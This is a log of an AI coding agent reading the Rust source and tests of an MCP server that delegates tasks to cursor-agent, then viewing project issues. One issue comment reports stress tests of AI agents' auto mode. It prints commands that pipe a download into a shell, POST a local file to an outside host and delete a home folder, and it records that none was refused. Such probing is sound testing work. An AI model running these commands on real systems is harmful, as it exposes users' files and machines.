{"type":"tool_call","subtype":"completed","call_id":"tool_4e93e1f1-346f-4353-86b4-ae4fb658fda","tool_call":{"readToolCall":{"args":{"path":"/Users/user/work/delegate-7-tracer/src/runner.rs"},"result":{"success":{"content":"use crate::capability::map_capability;\nuse crate::git::capture_head as capture_head_real;\nuse crate::isolation::map_isolation;\nuse crate::job_registry::{AnswerLookup, JobRegistry, WaitOpts};\nuse crate::models::resolve_model;\nuse crate::prompt::compose_prompt;\nuse crate::safety::{CliConfig, verify_deny_list};\nuse crate::types::{\n    Capability, Config, DispatchResult, Isolation, JobSpec, ResumeContext, RunInput,\n};\nuse std::sync::Arc;\n\npub type ResolveBinFn = Arc<dyn Fn(Option<&str>) -> String + Send + Sync>;\npub type CaptureHeadFn = Arc<dyn Fn(&str, Option<&str>) -> Option<String> + Send + Sync>;\n\npub struct RunnerDeps {\n    pub config: Config,\n    pub registry: Arc<JobRegistry>,\n    pub cli_config: Option<CliConfig>,\n    pub server_cwd: String,\n    pub resolve_bin: Option<ResolveBinFn>,\n    pub capture_head: Option<CaptureHeadFn>,\n}\n\npub fn build_argv(\n    model: &str,\n    cap_flags: &[String],\n    iso_flags: &[String],\n    session: Option<&str>,\n    prompt: &str,\n) -> Vec<String> {\n    let mut argv = vec![\n        \"--print\".into(),\n        \"--output-format\".into(),\n        \"stream-json\".into(),\n        \"--trust\".into(),\n        \"--approve-mcps\".into(),\n        \"--model\".into(),\n        model.to_string(),\n    ];\n    argv.extend(cap_flags.iter().cloned());\n    argv.extend(iso_flags.iter().cloned());\n    if let Some(s) = session {\n        argv.push(\"--resume\".into());\n        argv.push(s.to_string());\n    }\n    argv.push(\"--\".into());\n    argv.push(prompt.to_string());\n    argv\n}\n\npub fn run_delegation(\n    input: RunInput,\n    deps: &RunnerDeps,\n    opts: WaitOpts<'_>,\n) -> Result<DispatchResult, Box<dyn std::error::Error + Send + Sync>> {\n    let config = &deps.config;\n    let resolved = resolve_model(\n        input.model.as_deref(),\n        input.require_non_claude.unwrap_or(false),\n        config,\n    )?;\n\n    let capability = input.capability.unwrap_or(Capability::Ask);\n    let allow_unsandboxed = input.allow_unsandboxed.unwrap_or(false);\n    let isolation = input.isolation.clone().unwrap_or(Isolation::None);\n    let allow_partial_commit = input.allow_partial_commit.unwrap_or(false);\n\n    let cap = map_capability(capability, allow_unsandboxed);\n\n    if cap.forced {\n        verify_deny_list(\n            config.profile.required_deny.as_deref().unwrap_or(&[]),\n            deps.cli_config.as_ref(),\n        )?;\n    }\n\n    let iso = map_isolation(&isolation, &deps.server_cwd);\n\n    let prompt = compose_prompt(\n        config.profile.prompt_preamble.as_deref(),\n        input\n            .verify_commands\n            .as_deref()\n            .or(config.profile.verify_commands.as_deref()),\n        &input.prompt,\n    );\n\n    let gate = input\n        .gate\n        .clone()\n        .or_else(|| config.profile.gate.clone())\n        .unwrap_or_default();\n\n    let capture = |cwd: &str, r#ref: Option<&str>| {\n        if let Some(f) = &deps.capture_head {\n            f(cwd, r#ref)\n        } else {\n            capture_head_real(cwd, r#ref)\n        }\n    };\n\n    let (head_before, worktree_name) = match &isolation {\n        Isolation::BackendProvided { name, base } => {\n            (capture(&deps.server_cwd, base.as_deref()), name.clone())\n        }\n        _ => (capture(&iso.cwd, None), None),\n    };\n\n    let bin = if let Some(f) = &deps.resolve_bin {\n        f(None)\n    } else {\n        crate::cursor_bin::resolve_cursor_bin(None)\n    };\n    let argv = build_argv(\n        &resolved.model,\n        &cap.flags,\n        &iso.flags,\n        input.session.as_deref(),\n        &prompt,\n    );\n\n    let mut resume_context = ResumeContext {\n        model: resolved.model.clone(),\n        require_non_claude: None,\n        capability,\n        allow_unsandboxed,\n        isolation,\n        verify_commands: None,\n        gate: gate.clone(),\n        allow_partial_commit,\n    };\n    if input.require_non_claude.is_some() {\n        resume_context.require_non_claude = input.require_non_claude;\n    }\n    if input.verify_commands.is_some() {\n        resume_context.verify_commands = input.verify_commands.clone();\n    }\n\n    let spec = JobSpec {\n        bin,\n        argv,\n        cwd: iso.cwd,\n        model: resolved.model,\n        backend: \"cursor\".into(),\n        is_write: cap.is_write,\n        path: iso.path,\n        head_before,\n        gate,\n        allow_partial_commit,\n        wait_ms: input.wait_ms,\n        idle_ms: input.idle_ms,\n        tool_idle_ms: input.tool_idle_ms,\n        background: input.background,\n        price_map: config.price_map.clone(),\n        downgraded: cap.downgraded,\n        worktree_name,\n        resume_context,\n    };\n\n    Ok(deps.registry.dispatch(spec, opts))\n}\n\n#[derive(Debug)]\npub enum AnswerError {\n    NotFound,\n    NotAwaiting,\n}\n\nimpl std::fmt::Display for AnswerError {\n    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {\n        match self {\n            Self::NotFound => f.write_str(\"NOT_FOUND\"),\n            Self::NotAwaiting => f.write_str(\"job is not awaiting an answer\"),\n        }\n    }\n}\nimpl std::error::Error for AnswerError {}\n\npub fn answer_delegation(\n    job_id: &str,\n    answer: &str,\n    deps: &RunnerDeps,\n    opts: WaitOpts<'_>,\n) -> Result<DispatchResult, Box<dyn std::error::Error + Send + Sync>> {\n    match deps.registry.lookup_answer(job_id) {\n        AnswerLookup::NotFound => Err(Box::new(AnswerError::NotFound)),\n        AnswerLookup::NotAwaiting { .. } => Err(Box::new(AnswerError::NotAwaiting)),\n        AnswerLookup::Ok {\n            session_id,\n            resume_context,\n        } => {\n            let result = run_delegation(\n                RunInput {\n                    prompt: answer.to_string(),\n                    session: Some(session_id),\n                    model: Some(resume_context.model),\n                    require_non_claude: resume_context.require_non_claude,\n                    capability: Some(resume_context.capability),\n                    allow_unsandboxed: Some(resume_context.allow_unsandboxed),\n                    isolation: Some(resume_context.isolation),\n                    verify_commands: resume_context.verify_commands,\n                    gate: Some(resume_context.gate),\n                    allow_partial_commit: Some(resume_context.allow_partial_commit),\n                    ..RunInput::default()\n                },\n                deps,\n                opts,\n            )?;\n            // The old record stays NEEDS_CONTEXT forever — point watchers at the run that\n            // actually continues the work. Only when the resume detached to a new jobId.\n            if let DispatchResult::Detached { job_id: new_id, .. } = &result {\n                deps.registry.mark_superseded(job_id, new_id);\n            }\n            Ok(result)\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests;\n","isEmpty":false,"exceededLimit":false,"totalLines":222,"fileSize":6757,"path":"/Users/user/work/delegate-7-tracer/src/runner.rs","readRange":{"startLine":1,"endLine":222},"relatedCursorRulePaths":[],"relatedCursorRules":[]}}},"hookAdditionalContexts":[],"toolCallId":"tool_4e93e1f1-346f-4353-86b4-ae4fb658fda","startedAtMs":"1790842905361","completedAtMs":"1790842906249"},"model_call_id":"1980f2fa-bcff-4397-b8a1-23601c4723d6-0-8565","session_id":"36627d89-4873-4238-8376-e9782bc73a39","timestamp_ms":1790842906195}
{"type":"tool_call","subtype":"completed","call_id":"tool_c7c6053d-52b3-4894-8bec-02849f10dd1","tool_call":{"readToolCall":{"args":{"path":"/Users/user/work/delegate-7-tracer/Cargo.toml"},"result":{"success":{"content":"[package]\nname = \"cursor-delegate-mcp\"\nversion = \"0.5.0\"\nedition = \"2024\"\nlicense = \"MIT\"\n\n[dependencies]\nserde = { version = \"1\", features = [\"derive\"] }\nserde_json = { version = \"1\", features = [\"preserve_order\"] }\nlibc = \"0.2\"\nindexmap = { version = \"2\", features = [\"serde\"] }\n\n[profile.release]\nopt-level = \"s\"\nlto = true\ncodegen-units = 1\nstrip = true\n","isEmpty":false,"exceededLimit":false,"totalLines":18,"fileSize":358,"path":"/Users/user/work/delegate-7-tracer/Cargo.toml","readRange":{"startLine":1,"endLine":18},"relatedCursorRulePaths":[],"relatedCursorRules":[]}}},"hookAdditionalContexts":[],"toolCallId":"tool_c7c6053d-52b3-4894-8bec-02849f10dd1","startedAtMs":"1790842905893","completedAtMs":"1790842906373"},"model_call_id":"1980f2fa-bcff-4397-b8a1-23601c4723d6-0-8565","session_id":"36627d89-4873-4238-8376-e9782bc73a39","timestamp_ms":1790842906288}
{"type":"tool_call","subtype":"completed","call_id":"tool_5cf776de-60d8-435d-a3d0-0639c09736d","tool_call":{"readToolCall":{"args":{"path":"/Users/user/work/delegate-7-tracer/tests/e2e.rs"},"result":{"success":{"content":"//! Drives the real binary over stdio with a fake cursor-agent, the way an MCP client does.\n\nuse serde_json::{Value, json};\nuse std::io::{BufRead, BufReader, Write};\nuse std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};\nuse std::time::{Duration, Instant};\n\nconst FAKE_AGENT: &str = r#\"#!/bin/sh\nprintf '%s\\n' '{\"type\":\"tool_call\",\"subtype\":\"started\",\"tool_call\":{\"shellToolCall\":{\"args\":{\"command\":\"ls\"}}}}'\ncase \"$*\" in *HANG*) sleep 300 ;; esac\nprintf '%s\\n' '{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,\"result\":\"hi\\nSTATUS: DONE\",\"session_id\":\"s-1\"}'\n\"#;\n\nstruct Server {\n    child: Child,\n    stdin: ChildStdin,\n    stdout: BufReader<ChildStdout>,\n}\n\nimpl Server {\n    fn start(dir: &std::path::Path) -> Self {\n        let agent = dir.join(\"agent.sh\");\n        std::fs::write(&agent, FAKE_AGENT).unwrap();\n        Command::new(\"chmod\")\n            .arg(\"+x\")\n            .arg(&agent)\n            .status()\n            .unwrap();\n        let mut child = Command::new(env!(\"CARGO_BIN_EXE_cursor-delegate-mcp\"))\n            .current_dir(dir)\n            .env(\"CURSOR_AGENT_BIN\", &agent)\n            .stdin(Stdio::piped())\n            .stdout(Stdio::piped())\n            .spawn()\n            .unwrap();\n        let stdin = child.stdin.take().unwrap();\n        let stdout = BufReader::new(child.stdout.take().unwrap());\n        let mut s = Server {\n            child,\n            stdin,\n            stdout,\n        };\n        s.call(json!({\"jsonrpc\":\"2.0\",\"id\":0,\"method\":\"initialize\",\"params\":{\n            \"protocolVersion\":\"2025-06-18\",\"capabilities\":{},\"clientInfo\":{\"name\":\"t\",\"version\":\"0\"}}}));\n        s\n    }\n\n    /// Send a request and return its reply, skipping notifications.\n    fn call(&mut self, req: Value) -> Value {\n        writeln!(self.stdin, \"{req}\").unwrap();\n        loop {\n            let mut line = String::new();\n            self.stdout.read_line(&mut line).unwrap();\n            let v: Value = serde_json::from_str(&line).unwrap();\n            if v.get(\"id\") == req.get(\"id\") {\n                return v;\n            }\n        }\n    }\n\n    fn tool(&mut self, id: u64, name: &str, args: Value) -> Value {\n        let r = self.call(json!({\"jsonrpc\":\"2.0\",\"id\":id,\"method\":\"tools/call\",\n            \"params\":{\"name\":name,\"arguments\":args}}));\n        serde_json::from_str(r[\"result\"][\"content\"][0][\"text\"].as_str().unwrap()).unwrap()\n    }\n}\n\nfn scratch(name: &str) -> std::path::PathBuf {\n    let d = std::env::temp_dir().join(format!(\"cdm-e2e-{name}-{}\", std::process::id()));\n    std::fs::create_dir_all(&d).unwrap();\n    d\n}\n\nfn alive(pid: i32) -> bool {\n    unsafe { libc::kill(pid, 0) == 0 }\n}\n\nfn agent_pids(dir: &std::path::Path) -> Vec<i32> {\n    let out = Command::new(\"pgrep\")\n        .arg(\"-f\")\n        .arg(dir.join(\"agent.sh\"))\n        .output()\n        .unwrap();\n    String::from_utf8_lossy(&out.stdout)\n        .split_whitespace()\n        .map(|p| p.parse().unwrap())\n        .collect()\n}\n\n#[test]\nfn run_completes_and_cancel_kills_a_hung_agent() {\n    let dir = scratch(\"cancel\");\n    let mut s = Server::start(&dir);\n\n    let done = s.tool(1, \"cursor_run\", json!({\"prompt\":\"hi\"}));\n    assert_eq!(done[\"status\"], \"DONE\");\n    assert_eq!(done[\"sessionId\"], \"s-1\");\n\n    let bg = s.tool(2, \"cursor_run\", json!({\"prompt\":\"HANG\",\"background\":true}));\n    let job = bg[\"jobId\"].as_str().unwrap().to_string();\n    std::thread::sleep(Duration::from_millis(300));\n    let pids = agent_pids(&dir);\n    assert!(!pids.is_empty());\n\n    let t = Instant::now();\n    let cancelled = s.tool(3, \"cursor_cancel\", json!({\"jobId\": job}));\n    assert_eq!(cancelled[\"status\"], \"CANCELLED\");\n    assert!(\n        t.elapsed() < Duration::from_secs(5),\n        \"cancel took {:?}\",\n        t.elapsed()\n    );\n    assert!(pids.iter().all(|p| !alive(*p)), \"agent survived SIGTERM\");\n\n    drop(s.stdin);\n    s.child.wait().unwrap();\n}\n\n#[test]\nfn cancelled_request_gets_no_reply() {\n    let dir = scratch(\"cancel-reply\");\n    let mut s = Server::start(&dir);\n    let bg = s.tool(1, \"cursor_run\", json!({\"prompt\":\"HANG\",\"background\":true}));\n    let job = bg[\"jobId\"].as_str().unwrap();\n\n    writeln!(\n        s.stdin,\n        \"{}\",\n        json!({\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\n        \"params\":{\"name\":\"cursor_wait\",\"arguments\":{\"jobId\":job,\"timeoutMs\":60000}}})\n    )\n    .unwrap();\n    std::thread::sleep(Duration::from_millis(200));\n    writeln!(\n        s.stdin,\n        \"{}\",\n        json!({\"jsonrpc\":\"2.0\",\"method\":\"notifications/cancelled\",\n        \"params\":{\"requestId\":2}})\n    )\n    .unwrap();\n    std::thread::sleep(Duration::from_millis(300));\n\n    // The ping reply comes back; nothing for id 2 precedes it.\n    writeln!(\n        s.stdin,\n        \"{}\",\n        json!({\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"ping\"})\n    )\n    .unwrap();\n    loop {\n        let mut line = String::new();\n        s.stdout.read_line(&mut line).unwrap();\n        let v: Value = serde_json::from_str(&line).unwrap();\n        assert_ne!(v[\"id\"], 2, \"reply sent for a cancelled request: {v}\");\n        if v[\"id\"] == 3 {\n            break;\n        }\n    }\n    s.tool(4, \"cursor_cancel\", json!({\"jobId\": job}));\n    drop(s.stdin);\n    s.child.wait().unwrap();\n}\n\n#[test]\nfn sigterm_to_the_server_kills_running_agents() {\n    let dir = scratch(\"shutdown\");\n    let mut s = Server::start(&dir);\n    s.tool(1, \"cursor_run\", json!({\"prompt\":\"HANG\",\"background\":true}));\n    std::thread::sleep(Duration::from_millis(300));\n    let pids = agent_pids(&dir);\n    assert!(!pids.is_empty());\n\n    unsafe { libc::kill(s.child.id() as i32, libc::SIGTERM) };\n    s.child.wait().unwrap();\n    std::thread::sleep(Duration::from_millis(200));\n    assert!(\n        pids.iter().all(|p| !alive(*p)),\n        \"agent survived server shutdown\"\n    );\n}\n","isEmpty":false,"exceededLimit":false,"totalLines":181,"fileSize":5765,"path":"/Users/user/work/delegate-7-tracer/tests/e2e.rs","readRange":{"startLine":1,"endLine":181},"relatedCursorRulePaths":[],"relatedCursorRules":[]}}},"hookAdditionalContexts":[],"toolCallId":"tool_5cf776de-60d8-435d-a3d0-0639c09736d","startedAtMs":"1790842905648","completedAtMs":"1790842906380"},"model_call_id":"1980f2fa-bcff-4397-b8a1-23601c4723d6-0-8565","session_id":"36627d89-4873-4238-8376-e9782bc73a39","timestamp_ms":1790842906296}
{"type":"tool_call","subtype":"completed","call_id":"tool_dd4f6bbf-ef03-49ef-9b35-d504b271fcb","tool_call":{"shellToolCall":{"args":{"command":"cd /Users/user/work/delegate-7-tracer && gh issue view 7","workingDirectory":"","timeout":30000,"toolCallId":"tool_dd4f6bbf-ef03-49ef-9b35-d504b271fcb","simpleCommands":["cd","gh"],"hasInputRedirect":false,"hasOutputRedirect":false,"parsingResult":{"parsingFailed":false,"executableCommands":[{"name":"cd","args":[{"type":"word","value":"/Users/user/work/delegate-7-tracer"}],"fullText":"cd /Users/user/work/delegate-7-tracer"},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"number","value":"7"}],"fullText":"gh issue view 7"}],"hasRedirects":false,"hasCommandSubstitution":false,"redirects":[]},"fileOutputThresholdBytes":"40000","isBackground":false,"skipApproval":false,"timeoutBehavior":"TIMEOUT_BEHAVIOR_BACKGROUND","hardTimeout":86400000,"description":"View GitHub issue #7","closeStdin":true,"conversationId":"36627d89-4873-4238-8376-e9782bc73a39","adminCommandDenylist":[],"requestId":"1980f2fa-bcff-4397-b8a1-23601c4723d6"},"result":{"success":{"command":"cd /Users/user/work/delegate-7-tracer && gh issue view 7","workingDirectory":"","exitCode":0,"signal":"","stdout":"title:\tTracer: delegate run + supervisor + watch on cursor\nstate:\tOPEN\nauthor:\tuser (Amogh Akshintala)\nlabels:\tready-for-agent\ncomments:\t0\nassignees:\t\nprojects:\t\nmilestone:\t\nissue-type:\t\nparent:\t\nsub-issues:\t\nsub-issues-completed:\t\nblocked-by:\tuser/delegate#6\nblocking:\tuser/delegate#11, user/delegate#10, user/delegate#9\nnumber:\t7\n--\n## Parent\n\n#4\n\n## What to build\n\nThe tracer bullet for the CLI. A `delegate` binary built alongside the existing MCP server, which keeps working.\n\n- `delegate run --model M [--capability read-only|read-write] [--cwd D]`, prompt on stdin or `--prompt-file`, validates input, writes the job's status record, starts a detached supervisor (own session and process group, stdio redirected), prints the job id and exits.\n- The supervisor runs cursor-agent, writes a heartbeat while running, parses the final STATUS line (including NEEDS_CONTEXT), and writes the terminal record with the full result (status, text, usage, cost, session id, plus what resume needs: model, cwd, capability).\n- `delegate watch <jobId>... [--timeout S]` blocks until every record is terminal or the timeout passes, then prints each record.\n- read-only maps to cursor ask mode; read-write to `--sandbox disabled`; both keep `--force`.\n\nDrive this ticket's implementation through the recording script, saving the runs as fixtures.\n\nWeak point tested: a detached supervisor with the status record as the only source of truth.\n\n## Acceptance criteria\n\n- [ ] `run` returns a job id while the job is still running, and the job finishes after `run` has exited.\n- [ ] The status record shows RUNNING with an advancing heartbeat, then the terminal result.\n- [ ] `watch` prints all named records once terminal, and exits at its timeout otherwise.\n- [ ] An unknown model is rejected with the list of valid ids.\n- [ ] End-to-end tests drive the binary as a process against the fake cursor-agent.\n- [ ] The existing MCP server and its tests still pass.\n\n## Blocked by\n\n- #6 Record headless fixtures (recording script and probes)\n","stderr":"","executionTime":1853,"interleavedOutput":"title:\tTracer: delegate run + supervisor + watch on cursor\nstate:\tOPEN\nauthor:\tuser (Amogh Akshintala)\nlabels:\tready-for-agent\ncomments:\t0\nassignees:\t\nprojects:\t\nmilestone:\t\nissue-type:\t\nparent:\t\nsub-issues:\t\nsub-issues-completed:\t\nblocked-by:\tuser/delegate#6\nblocking:\tuser/delegate#11, user/delegate#10, user/delegate#9\nnumber:\t7\n--\n## Parent\n\n#4\n\n## What to build\n\nThe tracer bullet for the CLI. A `delegate` binary built alongside the existing MCP server, which keeps working.\n\n- `delegate run --model M [--capability read-only|read-write] [--cwd D]`, prompt on stdin or `--prompt-file`, validates input, writes the job's status record, starts a detached supervisor (own session and process group, stdio redirected), prints the job id and exits.\n- The supervisor runs cursor-agent, writes a heartbeat while running, parses the final STATUS line (including NEEDS_CONTEXT), and writes the terminal record with the full result (status, text, usage, cost, session id, plus what resume needs: model, cwd, capability).\n- `delegate watch <jobId>... [--timeout S]` blocks until every record is terminal or the timeout passes, then prints each record.\n- read-only maps to cursor ask mode; read-write to `--sandbox disabled`; both keep `--force`.\n\nDrive this ticket's implementation through the recording script, saving the runs as fixtures.\n\nWeak point tested: a detached supervisor with the status record as the only source of truth.\n\n## Acceptance criteria\n\n- [ ] `run` returns a job id while the job is still running, and the job finishes after `run` has exited.\n- [ ] The status record shows RUNNING with an advancing heartbeat, then the terminal result.\n- [ ] `watch` prints all named records once terminal, and exits at its timeout otherwise.\n- [ ] An unknown model is rejected with the list of valid ids.\n- [ ] End-to-end tests drive the binary as a process against the fake cursor-agent.\n- [ ] The existing MCP server and its tests still pass.\n\n## Blocked by\n\n- #6 Record headless fixtures (recording script and probes)\n","localExecutionTimeMs":1222},"isBackground":false},"description":"View GitHub issue #7"},"hookAdditionalContexts":[],"toolCallId":"tool_dd4f6bbf-ef03-49ef-9b35-d504b271fcb","startedAtMs":"1790842905346","completedAtMs":"1790842907336"},"model_call_id":"1980f2fa-bcff-4397-b8a1-23601c4723d6-0-8565","session_id":"36627d89-4873-4238-8376-e9782bc73a39","timestamp_ms":1790842907252}
{"type":"tool_call","subtype":"completed","call_id":"tool_eb875959-7d27-439a-8b4e-682d339e1b6","tool_call":{"shellToolCall":{"args":{"command":"cd /Users/user/work/delegate-7-tracer && gh issue view 4 --comments","workingDirectory":"","timeout":30000,"toolCallId":"tool_eb875959-7d27-439a-8b4e-682d339e1b6","simpleCommands":["cd","gh"],"hasInputRedirect":false,"hasOutputRedirect":false,"parsingResult":{"parsingFailed":false,"executableCommands":[{"name":"cd","args":[{"type":"word","value":"/Users/user/work/delegate-7-tracer"}],"fullText":"cd /Users/user/work/delegate-7-tracer"},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"number","value":"4"},{"type":"word","value":"--comments"}],"fullText":"gh issue view 4 --comments"}],"hasRedirects":false,"hasCommandSubstitution":false,"redirects":[]},"fileOutputThresholdBytes":"40000","isBackground":false,"skipApproval":false,"timeoutBehavior":"TIMEOUT_BEHAVIOR_BACKGROUND","hardTimeout":86400000,"description":"View GitHub issue #4 with comments","closeStdin":true,"conversationId":"36627d89-4873-4238-8376-e9782bc73a39","adminCommandDenylist":[],"requestId":"1980f2fa-bcff-4397-b8a1-23601c4723d6"},"result":{"success":{"command":"cd /Users/user/work/delegate-7-tracer && gh issue view 4 --comments","workingDirectory":"","exitCode":0,"signal":"","stdout":"author:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #PRNUM. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to proceed, and I'll do it. STATUS: NEEDS_CONTEXT\". The tree was unchanged.\n- `permission_denials` is `[]` in every run. No ExitPlanMode call appears in the stream.\n\n**Decision for #17: keep `--permission-mode plan` for read-only Claude. No fallback.** It answers read-only work and refuses edits by ending NEEDS_CONTEXT, which resume handles (`--capability read-write`). A `--disallowedTools Edit,Write,…` fallback would block plan-file writes but not Bash, so it is weaker. Not tested: whether plan mode blocks a writing Bash command.\n\n### How often does auto mode refuse, and what does a refusal look like?\n\n0 refusals in 3 probes, with `permissionMode: \"auto\"` confirmed in each `system/init` event:\n\n- `claude/auto-refusal`: `curl -s https://example.com | sh` ran (it failed on HTML). For `rm -rf ~/Downloads/old-builds`, the model checked with `ls` first; the directory was absent.\n- `claude/auto-refusal-exfil`: `curl -X POST --data-binary @calc.py https://httpbin.org/post` ran and the POST succeeded.\n\nNo refusal was captured, so its stream shape is still unknown. The likely shape is a `tool_result` with `is_error: true` plus an entry in the result line's `permission_denials`. The parser should surface `permission_denials` when it is non-empty.\n\nA delegated Claude also loads the user's global instructions. In `claude/auto-fix` it committed the fix on a new branch (`fix-add-operator`) and left the tree clean. The change-set must count commits, not only dirty files.\n\n### Does `--session-id` create the session, and does a second run continue it?\n\nYes, for both pi and Claude.\n\n- **pi:** a first use prints `Warning: No project session found with id '<id>'; creating a new session with that id.` on stderr and exits 0. The second run with the same id (`pi/resume-answer`) prints no warning, and the model answers `392` (previous answer + 1). The `session` header line carries the id.\n- **claude:** `--session-id <uuid>` on the first run, then `--resume <uuid>` (`claude/resume-answer`) answers `392`. The result line keeps the same `session_id`. Untested: reusing `--session-id` on an existing session; the spec uses `--resume`.\n- **cursor:** `--resume <session_id from the result line>` (`cursor/resume-answer`) answers `392`.\n\n### Errors\n\n- **cursor** (`cursor/error-bad-model`): exits 1 with empty stdout. stderr holds the message and the list of valid models.\n- **pi** (`pi/error-bad-model`): **exits 0**. stderr warns `Model \"no-such-model\" not found … Using custom model id.` The stream ends normally with `agent_end`, whose last message has `stopReason: \"error\"` and `errorMessage: \"Codex error: The 'no-such-model' model is not supported …\"`. The parser must read `stopReason`, not the exit code.\n- **claude** (`claude/error-bad-model`): exits 1. stdout has a `result` line with `subtype: \"success\"`, `is_error: true` and the message in `result`. stderr has `[claude-code:unrecognized_model]`. The parser must read `is_error`, not `subtype`.\n\n### Cancelled (SIGTERM to the CLI)\n\nAll three backends exit 143 and stop mid-stream (`*/cancelled`). No `result` or `agent_end` line is written. The supervisor marks CANCELLED itself; nothing in the stream says so.\n\n### NEEDS_CONTEXT\n\nAll three backends end with a question and `STATUS: NEEDS_CONTEXT` in the final text (`*/needs-context`). In a first attempt, cursor searched widely before asking (its own transcript store, `env`, a filesystem glob), which produced a 960KB stream that held the user's MCP tool descriptors. The committed fixture was re-recorded with \"do not search, ask me\".\n\n### Redaction\n\nRaw streams carry the recording user's setup: pi's system-prompt `sections` and extension `toolsAdded`, and Claude's `system/init` lists and `hook_response` output. `scripts/redact.jq` blanks these and keeps the event shapes. `record.sh` applies it and replaces the home-directory name. Any live test that records fixtures (#17 and the per-backend live tests) must use the same filter.\n\n### Cost and usage\n\n- **claude:** `total_cost_usd` on the result line.\n- **cursor:** the result line has `usage` with `inputTokens`, `outputTokens`, `cacheReadTokens` and `cacheWriteTokens`, and no cost.\n- **pi:** `usage.cost` appears on messages. The `agent_end` last-message cost (`$0.00016` in `pi/tool-calls-fix`) looks per-message. #16 should verify whether the run total needs summing over `message_end` events.\n\n### Stream noise the parsers must skip\n\n- **claude:** `system/hook_started`, `system/hook_response` (4 of them from user hooks), `system/commands_changed` and `rate_limit_event` arrive before the assistant turn.\n- **pi:** `entry_appended` and `turn_*`, and a final `agent_settled` after `agent_end`.\n- **cursor:** `thinking/delta` and `thinking/completed`.\n\n--\n","stderr":"","executionTime":1959,"interleavedOutput":"author:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #PRNUM. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to proceed, and I'll do it. STATUS: NEEDS_CONTEXT\". The tree was unchanged.\n- `permission_denials` is `[]` in every run. No ExitPlanMode call appears in the stream.\n\n**Decision for #17: keep `--permission-mode plan` for read-only Claude. No fallback.** It answers read-only work and refuses edits by ending NEEDS_CONTEXT, which resume handles (`--capability read-write`). A `--disallowedTools Edit,Write,…` fallback would block plan-file writes but not Bash, so it is weaker. Not tested: whether plan mode blocks a writing Bash command.\n\n### How often does auto mode refuse, and what does a refusal look like?\n\n0 refusals in 3 probes, with `permissionMode: \"auto\"` confirmed in each `system/init` event:\n\n- `claude/auto-refusal`: `curl -s https://example.com | sh` ran (it failed on HTML). For `rm -rf ~/Downloads/old-builds`, the model checked with `ls` first; the directory was absent.\n- `claude/auto-refusal-exfil`: `curl -X POST --data-binary @calc.py https://httpbin.org/post` ran and the POST succeeded.\n\nNo refusal was captured, so its stream shape is still unknown. The likely shape is a `tool_result` with `is_error: true` plus an entry in the result line's `permission_denials`. The parser should surface `permission_denials` when it is non-empty.\n\nA delegated Claude also loads the user's global instructions. In `claude/auto-fix` it committed the fix on a new branch (`fix-add-operator`) and left the tree clean. The change-set must count commits, not only dirty files.\n\n### Does `--session-id` create the session, and does a second run continue it?\n\nYes, for both pi and Claude.\n\n- **pi:** a first use prints `Warning: No project session found with id '<id>'; creating a new session with that id.` on stderr and exits 0. The second run with the same id (`pi/resume-answer`) prints no warning, and the model answers `392` (previous answer + 1). The `session` header line carries the id.\n- **claude:** `--session-id <uuid>` on the first run, then `--resume <uuid>` (`claude/resume-answer`) answers `392`. The result line keeps the same `session_id`. Untested: reusing `--session-id` on an existing session; the spec uses `--resume`.\n- **cursor:** `--resume <session_id from the result line>` (`cursor/resume-answer`) answers `392`.\n\n### Errors\n\n- **cursor** (`cursor/error-bad-model`): exits 1 with empty stdout. stderr holds the message and the list of valid models.\n- **pi** (`pi/error-bad-model`): **exits 0**. stderr warns `Model \"no-such-model\" not found … Using custom model id.` The stream ends normally with `agent_end`, whose last message has `stopReason: \"error\"` and `errorMessage: \"Codex error: The 'no-such-model' model is not supported …\"`. The parser must read `stopReason`, not the exit code.\n- **claude** (`claude/error-bad-model`): exits 1. stdout has a `result` line with `subtype: \"success\"`, `is_error: true` and the message in `result`. stderr has `[claude-code:unrecognized_model]`. The parser must read `is_error`, not `subtype`.\n\n### Cancelled (SIGTERM to the CLI)\n\nAll three backends exit 143 and stop mid-stream (`*/cancelled`). No `result` or `agent_end` line is written. The supervisor marks CANCELLED itself; nothing in the stream says so.\n\n### NEEDS_CONTEXT\n\nAll three backends end with a question and `STATUS: NEEDS_CONTEXT` in the final text (`*/needs-context`). In a first attempt, cursor searched widely before asking (its own transcript store, `env`, a filesystem glob), which produced a 960KB stream that held the user's MCP tool descriptors. The committed fixture was re-recorded with \"do not search, ask me\".\n\n### Redaction\n\nRaw streams carry the recording user's setup: pi's system-prompt `sections` and extension `toolsAdded`, and Claude's `system/init` lists and `hook_response` output. `scripts/redact.jq` 